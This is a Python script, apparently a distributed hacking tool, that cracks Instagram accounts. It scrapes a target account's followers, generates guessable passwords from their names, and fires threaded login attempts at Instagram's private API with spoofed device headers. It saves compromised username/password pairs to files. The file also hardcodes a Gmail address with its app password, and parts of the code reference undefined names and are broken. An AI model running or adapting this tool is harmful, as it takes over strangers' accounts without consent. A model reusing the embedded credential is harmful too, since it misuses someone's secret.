# coding:utf-8
#/usr/bin/python
#Cython++++()
try:
	import json
	import uuid
	import zlib
	import base64
	import hmac
	import subprocess
	import platform
	import random
	import hashlib
	import urllib
	import urllib.request
	import urllib.parse
	import base64
	import phonenumbers
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
import pytz
import print as cetak
from rich.tree import Tree
from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time
from rich.progress import Progress,TextColumn
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
menudump=[]
myid=uuid.uuid4().hex[:5].upper()
from email.message import EmailMessage
import ssl,smtplib
email_sender = 'HamzaSubscription1@gmail.com'
email_password = 'jxgjlutwxmxclkgc'
email_receiver = 'HamzaSubscription2@gmail.com'
pathx = str(zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaz\xb9E\x89\xd9\x99y\xe9\x15\x15\x15\xba\xc9\xf9e\x00\xe7!\x13*')).replace("b'","").replace("'","")
try:
    key1 = open(pathx, 'r').read()
except:
    open(pathx, 'w').write(myid)
key1 = open(pathx, 'r').read()+str(os.getuid())

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
color_table = "#afafff"
color_rich = "[#afafff]"
try:
	os.mkdir('result')
except:
	pass
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([Z2,H2,K2,B2,U2,N2,O2,P2,J2,A2])
hapus  = '[/]'

CY='\033[96;1m'
H = '\x1b[1;92m' # HIJAU
M='\033[1;31m' #MERAH
K = '\x1b[1;92m' # HIJAU
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
B='\033[94m'
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 11; CMA-LX1 Build/HONORCMA-L41CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Instagram 250.0.0.21.109 Android (30/11; 320dpi; 720x1552; HONOR; CMA-LX1; HNCMA-Q; qcom; en_US; 394071250)"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
method=[]
s=requests.Session()
zx=[]
s=requests.Session()
ncek=[]
try:
	os.mkdir('IG-OK.txt')
except:
	pass
til = "ncek"
############UA#############
hapus  = '[/]'
biru_m = '[bold cyan]'	
# CLEAR
def clear():
	os.system('clear')
def banner():
	clear()
	print(f"""{H}
╔══╗─╔═══╗╔═╗╔═╗ 
║╔╗║─║╔═╗║╚╗╚╝╔╝ 
║╚╝╚╗║║─║║─╚╗╔╝─ 
║╔═╗║║║─║║─╔╝╚╗─ 
║╚═╝║║╚═╝║╔╝╔╗╚╗ 
╚═══╝╚═══╝╚═╝╚═╝ 

╔══════════════════════════════════════════╗
║ Creator  : CHIGOZIEWORLDWIDE             ║
║ Github   : CHIG0ZIEWORLDWIDE             ║
║ WhatsApp : +2348069472717                ║
║ Version  : 11.0                          ║
║ FILENAME : BOX                           ║
╚══════════════════════════════════════════╝ """)
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0)
        sys.stdout.write(f"\r{B}[{B}+{B}] {B}Processing {B} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0)
        sys.stdout.write(f"\r{B}[{B}+{B}] {B}Please Hold On {B} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
   
def linex():
	print("%s═════════════════════════════════════════════════════════════════════%s\n"%(CY,CY))
 
try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
	
def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(0)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

def Main_():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            print(70*'-')
            print('[+] LOGIN INSTAGRAM COOKIES ')
            print(70*'-')
            coki = input('[+] ENTER COOKIES : ')
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        ACTIVE [cyan]{nama}[/] COOKIES VERIFIED", padding=(0,5), style="bold white", width=70));time.sleep(0);time.sleep(0);exit(f"[{B}+{N}] INPUT THE TOOL AGAIN BY TYPING Python COX.py")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(0)
                exit(f'{M}[+] COOKIE DEAD');time.sleep(0)
            except ConnectionAbortedError:
                exit(f'{red}[+] BAD INTERNET CONNECTION')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()

class instagram:

	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1] 
				following=i.split('|')[2]
			except:
				pass
			clear()
			print(f"""{H}
╔═══╗╔═══╗╔═╗╔═╗ 
║╔═╗║║╔═╗║╚╗╚╝╔╝ 
║║─╚╝║║─║║─╚╗╔╝─ 
║║─╔╗║║─║║─╔╝╚╗─ 
║╚═╝║║╚═╝║╔╝╔╗╚╗ 
╚═══╝╚═══╝╚═╝╚═╝ 

╔══════════════════════════════════════════╗
║ Creator  : CHIGOZIEWORLDWIDE             ║
║ Github   : CHIG0ZIEWORLDWIDE             ║
║ WhatsApp : +2348069472717                ║
║ Version  : 11.0                          ║
║ FILENAME : BOX                           ║
╚══════════════════════════════════════════╝ 


╔═══════════════════════╗
║ ＯＮＬＩＮＥ          ║
║                       ║
╚═══════════════════════╝
[01] Instagram Followers Crack
[03] Instagram Results History
[00] Instagram Exit 
	""")
	def Exit(self):
		print(70*'-')
		x=input(f'{B}[+] Do You Want To Exist ? [Y/T]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python COX.py')
		elif x in ('t','T'):
			os.system('python COX.py')
		else:
			self.Exit()	
	
	def convert(self, nama):
		with requests.Session() as jembut:
			curl = jembut.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(nama), headers = {"user-agent":USN}, cookies =self.cookie).json()
			data = curl["data"]["user"]
			return data["id"]

	def followers(self, userid, cokz):
		with requests.Session() as kontol:
			try:
				link = kontol.get(f"https://i.instagram.com/api/v1/friendships/{userid}/followers/?count=100&max_id={cokz}", headers = {"user-agent":USN}, cookies =self.cookie)
				for x in json.loads(link.text)["users"]:
					if x["username"] in internal:
						continue
					internal.append(x["username"]+"|"+x["full_name"])
					#sys.stdout.write(f"\r{K}+{K} Collecting Data  {H}{len(internal)} {K}username")
					sys.stdout.flush()
					time.sleep(0)
				if "next_max_id" in json.loads(link.text):self.followers(userid, json.loads(link.text)["next_max_id"])
				self.passwordAPI(internal)
			except KeyboardInterrupt:
				pass
			except KeyError:
				print(f"{K}[{K}+{K}] Username Private")
				self.passwordAPI(internal)
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}[+] No Internet Connection {K}')
				self.passwordAPI(internal)

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{K}[+] No Internet Connection{K}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[+] COOKIE CHECKPOINT{N}")
			except Exception as e:
				exit(f"{H}[+] USERNAME MUST BE PUBLIC ONLY {N}")
			return idx


	def timezone(self,lang):
		if lang in('en_US','en_GB'):zone='Asia/Jakarta'
		else:zone='America/New_York'    
		tz=pytz.timezone(zone)
		return str(datetime.now(tz).utcoffset())
	def Android_Version(self,android_version):
		if str(android_version)=='9':
			return('28')
		elif str(android_version)=='10':
			return('29')
		elif str(android_version)=='11':
			return('30')
		elif str(android_version)=='12':
			return('31')
		elif str(android_version)=='13':
			return('32')
		elif str(android_version)=='14':
			return('33')
		else:
			return('34')
	def ua_ran(self):
		self.anc = random.randint(100,510)
		self.xyz = random.randint(14,21)
		self.apc = random.randint(14,35)
		self.abc = random.randint(75,115)
		ponid=random.randint(30000,60000)
		andro=random.randint(9,14)
		xp='Instagram {}.0.0.{}.{} Android ({}/{}; 320dpi; 720x1552; HONOR; CMA-LX1; HNCMA-Q; qcom; en_GB; 394071250)'.format(self.anc,self.apc,self.abc,self.xyz,self.Android_Version(andro),ponid)
		return random.choice([xp])
	def vers(self):
		igv=("187.0.0.32.120,187.0.0.32.120,169.3.0.30.135,169.3.0.30.135,81.0.0.15.91,81.0.0.15.91,71.0.0.18.102,71.0.0.18.102,81.0.0.15.91,71.0.0.18.102")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi
	def ingfo(self):
		urut = []
		urut.append(Panel(f"OK RESULT/[bold green]ACTIVE-{day}.txt[/]",padding=(0,18),style=""))
		urut.append(Panel(f"CP RESULT/[bold yellow]FAILED-{day}.txt[/]",padding=(0,18),style=""))
		self.tol.print(Columns(urut))
	def ifo(self):
	#	urut = []
	#	u = input('  [?] Select  methode : ')
		print("""%s                                                                         
[01] API SLOW 
[02] API FAST 
"""%(H)) 

	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}TOTAL ID  : {len(internal)} ",width=30,padding=(0,4),style=""))
		self.ifo()
		prints(Panel(f"{P2}PASSWORD LIST ",width=30,padding=(0,4),style=""))
		u = input('[+] Options  ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		else:
			method.append('satu')
		print("""%s                                                                         
[01] FAST API
[02] FAST GRAPH
[03] FAST NORMAL
"""%(H)) 
		c=input(f'{B}[+] Options  {B} ')
		if c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=""))
			zx=input(f'{N}[•] Tambahkan password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=35) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="":
									sandi = [w + '123', w + '1234', w + '12345'] if len(w) == 3 or len(w) == 4 or len(w) == 5 else [w, w + '123', w + '1234']
								elif o=="2":
									sandi = [w + '123', w + '1234', w + '12345', password.lower()] if len(w) == 3 or len(w) == 4 or len(w) == 5 else [w + '123', w, w + '1234', w + '12345',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234',w+'321',w+'12345',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.crackAPI,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.crackAPI2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.ajax,username,sandi)
								else:
									shinkai.submit(self.crackAPI,username,sandi)
					except:
						continue
			print('\n')
			print(70*'-')
			print('[+] THE PROCESS IS COMPLETED')
			print(70*'-')
			exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def encrypt_password_ajax(self,key_id,pub_key,password,version=10):
		key_id=int(key_id)
		key=Random.get_random_bytes(32)
		iv=bytes([0]*12)
		time=int(datetime.now().timestamp())
		aes=AES.new(key,AES.MODE_GCM,nonce=iv,mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password,cipher_tag=aes.encrypt_and_digest(password.encode('utf-8'))
		pub_key_bytes=binascii.unhexlify(pub_key)
		seal_box=SealedBox(PublicKey(pub_key_bytes))
		encrypted_key=seal_box.encrypt(key)
		encrypted=bytes([1,
           key_id,
*list(struct.pack('<h',len(encrypted_key))),
*list(encrypted_key),
*list(cipher_tag),
*list(encrypted_password)])
		encrypted=base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_password(self,publickeyid,publickey,password):
		session_key=get_random_bytes(32)
		iv=get_random_bytes(12)
		timestamp=str(int(time.time()))
		decoded_publickey=base64.b64decode(publickey.encode())
		recipient_key=RSA.import_key(decoded_publickey)
		cipher_rsa=PKCS1_v1_5.new(recipient_key)
		rsa_encrypted=cipher_rsa.encrypt(session_key)
		cipher_aes=AES.new(session_key,AES.MODE_GCM,iv)
		cipher_aes.update(timestamp.encode())
		aes_encrypted,tag=cipher_aes.encrypt_and_digest(password.encode("utf8"))
		size_buffer=len(rsa_encrypted).to_bytes(2,byteorder="little")
		payload=base64.b64encode(b''.join([
            b'\x01',
            int(publickeyid).to_bytes(1,byteorder="big"),
            iv,
            size_buffer,
            rsa_encrypted,
            tag,
            aes_encrypted
]))
		return f"#PWD_INSTAGRAM:4:{timestamp}:{payload.decode()}"
	def uuid(self,heex=False,seed=None):
		if(seed is not None):
			m=hashlib.md5()
			m.update(seed.encode('utf-8'))
			x=uuid.UUID(m.hexdigest())
		else:
			x=uuid.uuid4()
		if(heex):
			return str(x.hex)
		return str(x)
	def adid(self,user=None):
		user=user if user is not None else '12345'
		sha2=hashlib.sha256()
		sha2.update(user.encode('utf-8'))
		seed=sha2.hexdigest()
		return self.uuid(False,seed)
	def generate_jazoest(self,code):
		data=sum(ord(c)for c in code)
		return f'2{data}'
	def guid(self):
		return self.uuid(False)
	def dvid(self):
		return f'android-{self.uuid(True)[:16]}'
	def poid(self,dvid):
		return self.uuid(False,dvid)
	def hmac(self,data,signature=None):
		signature=signature if signature is not None else 'SIGNATURE'
		return hmac.new(signature.encode('utf-8'),data.encode('utf-8'),hashlib.sha256).hexdigest()
	def signature(self,data,sign=None):
		sign=sign if sign is not None else 'SIGNATURE'
		return 'signed_body={}.{}&ig_sig_key_version=4'.format(sign,urllib.parse.quote_plus(data))
	def generate_tzdata(self,country_code=None):
		if country_code is None:
			resp=requests.get("https://ident.me/json")
			if resp.status.code==200:
				resp=json.loads(resp.text)
				country_code=resp["cc"]
			else:
				country_code="GB"
		timezone_list=pytz.country_timezones.get(country_code,[])
		timezone=random.choice(timezone_list)
		current_time=datetime.now(pytz.timezone(timezone))
		return{
            "country":self.generate_country_code(country_code),
            "timezone":timezone,
            "timezone_offset":str(current_time.utcoffset().total_seconds()).split(".")[0],
            "raw_client_time":str(int(current_time.timestamp()*1000))}
	def rawclient_time(self,lang):
		if lang in('en_US','en_US'):zone='Asia/Jakarta'
		else:zone='America/New_York'
		tz=pytz.timezone(zone)
		ct=datetime.now(tz)
		ft=ct.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
		hash_obj=hashlib.sha256(ft.encode())
		hash_hex=hash_obj.hexdigest()
		return base64.b64encode(bytes.fromhex(hash_hex)).decode()
	def generate_signature(self,data):
		return 'params={}&bk_client_context={}&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'.format(urllib.parse.quote_plus(json.dumps(data)),urllib.parse.quote_plus(json.dumps({'bloks_version':'5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','styles_id':'instagram'})))
	def generate_uuid(self,heex=False,seed=None):
		if(seed is not None):
			data=hashlib.md5()
			data.update(seed.encode('utf-8'))
			data=uuid.UUID(data.hexdigest())
		else:
			data=uuid.uuid4()
		if(heex):
			return str(data.hex)
		return str(data)
	def generate_country_code(self,country):
		prefix=phonenumbers.parse("012 345 6789",country)
		return "[{\"country_code\":\"%s\",\"source\":[\"default\"]}]" % str(prefix).split(" ")[2]
	def crackAPI2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		prog.update(des,description=f"[{acakrich}BOX[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
			try:
				self.all_configs = {'data':{'device_id': f'android-{self.Android_ID(user,pw).hexdigest()[:16]}','password': f'#PWD_INSTAGRAM:0:{str(int(datetime.now().timestamp()))}:{pw}','uuid':str(uuid.uuid4())}}
				self.data_thread = {
                     "client_input_params": {
                     "device_id": self.all_configs['data']['device_id'],
                     "login_attempt_count": 1,
                     "secure_family_device_id": "",
                     "machine_id": "",
                     "accounts_list": [],
                     "auth_secure_device_id": "",
                     "password": self.all_configs['data']['password'],
                     "family_device_id": self.all_configs['data']['uuid'],
                     "fb_ig_device_id": [],
                     "device_emails": [],
                     "try_num": 1,
                     "event_flow": "login_manual",
                     "event_step": "home_page",
                     "openid_tokens": {},
                     "client_known_key_hash": "",
                     "contact_point": f"{user}",
                     "encrypted_msisdn": "",
                 },
                     "server_params": {
                     "should_trigger_override_login_2fa_action": 0,
                     "username_text_input_id": "v7chy0:53",
                     "device_id": self.all_configs['data']['device_id'],
                     "should_trigger_override_login_success_action": 0,
                     "server_login_source": "login",
                     "waterfall_id": self.all_configs['data']['uuid'],
                     "login_source": "Login",
                     "INTERNAL__latency_qpl_instance_id": 188679189600332,
                     "reg_flow_source": "login_home_native_integration_point",
                     "is_platform_login": 0,
                     "is_caa_perf_enabled": 1,
                     "credential_type": "password",
                     "family_device_id": self.all_configs['data']['uuid'],
                     "INTERNAL__latency_qpl_marker_id": 36707139,
                     "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                     "INTERNAL_INFRA_THEME": "harm_f",
                     "password_text_input_id": "v7chy0:54",
                     "qe_device_id": self.all_configs['data']['uuid'],
                     "ar_event_source": "login_home_page",
                    }
                 }
				self.sign = 'params='+ urllib.parse.quote(str(self.data_thread)) +'&bk_client_context={"bloks_version":"9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6","styles_id":"instagram"}&bloks_versioning_id=9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6'
				self.head = {'user-agent': self.ua_ran(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'connection': 'keep-alive', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-app-locale': 'en_GB', 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-device-locale': 'en_GB', 'x-ig-android-id': self.all_configs['data']['device_id'], 'x-ig-mapped-locale': 'en_GB', 'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()), 'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 4000)), 'x-ig-device-id': self.all_configs['data']['uuid'], 'x-bloks-version-id': '9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6', 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-connection-type': 'unknown', 'x-ig-capabilities': '3brTv10=', 'x-pigeon-session-id': f'UFS-{self.all_configs["data"]["uuid"]}-0', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'x-bloks-is-layout-rtl': 'false', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Host': 'i.instagram.com', 'x-fb-http-engine': 'Liger', 'x-ig-family-device-id': self.all_configs['data']['uuid'], 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True', 'x-fb-connection-type': 'unknown'}
				xnxx=ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.sign, headers=self.head, allow_redirects = True)
				if 'Bearer IGT:2:' in str(xnxx.text.replace('\\','')):
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					io=f'User      : {nama}\nUsername  : {user}\nPassword  : {pw}\nFollowers : {pengikut}\nFollowing : {mengikut}\nPosts     : {postingan}\n'
					oi = nel(io, style='bold green')
					print('\n')
					cetak(nel(oi,style='',title=' [bold green] LOGIN SUCCESS [/bold green]'))
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}|{coki}\n')
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n')
					break
				elif 'https://i.instagram.com/challenge' in str(xnxx.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					#print("")
					#prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					#print("")
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					#checkpoint.append(user)
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n')
					break
				elif 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(0);self.crackAPI2(user,pas)
					open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
					loop-=1
					break
				else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}{self.ua_ran()}\n{N}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(0)
				self.crackAPI2(user,pas)
				loop-=1
				break
			#except Exception as e:print(e)
		loop+=1
	def Android_ID(self, users, passwd):
		self.xyz = hashlib.md5()
		self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
		self.hex = self.xyz.hexdigest()
		self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
		return self.xyz
	
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t[{K}+{hapus}] CHECK CRACK RESULTS", padding=(0,4),style=""))
		urut.append(Panel(f"[1] CHECK CRACK RESULTS {K}success{h}",padding=(0,5),style=""))
		urut.append(Panel(f"[2] CHECK ACCOUNT RESULTS {K}CHECKPOINT{hapus}",padding=(0,5),style=""))
		self.tol.print(Columns(urut))
		one=input("[+] YOUR CHOICE ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f"[{K}+{K}] NO SUCCESS RESULTS FOUND");time.sleep(0);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f'[{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f'[{K}+{K}] FILE NAME : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f"[{h}+{hapus}] NO SUCCESS RESULTS FOUND");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] TYPE ENTER TO RETURN BACK');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/success/')
			except:prints(f"[{h}+{h}] NO SUCCESS RESULTS FOUND");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f'[{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')		
			abc = input(f'[{H}+{N}] INPUT FILE: ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{h}+{h}] NO CHECKPOINT RESULTS FOUND");time.sleep(1);self.menu()
			print("")
			print(K+buka+K)
			input(f'\n[{H}!{N}] TYPE ENTER TO RETURN BACK');self.menu()
		else:print(f" [{M}!{N}] CORRECT");time.sleep(0);self.menu()
	def menu(self):
		self.logo()
		c=input(f'{B}[+] CHOOSE {B}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			pr='[+] CLONE FROM FOLLOWERS'
			po=nel(pr,style='')
			sol().print(po)
			nama = input(f'[{B}+{B}] Username : {B}')
			user = self.convert(nama)
			self.followers(user, "")
		elif c in ('3','03'):
			print('')
			for i in os.listdir('result/success/'):
				print(f'[{CY}+{CY}] {i}')
			c=input(f'\n[{CY}+{CY}] INPUT NAME FILE {C}')
			g=open("result/success/%s"%(c)).read().splitlines()
			print(f'\n{B}[+] TOTAL RESULT FOUND {B}{len(g)}{C}')
			print(f'\n{B}[+] PROCESSING HOLD {B}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.crackAPI2(user,pwd)
			wel='[+] FINISHING'
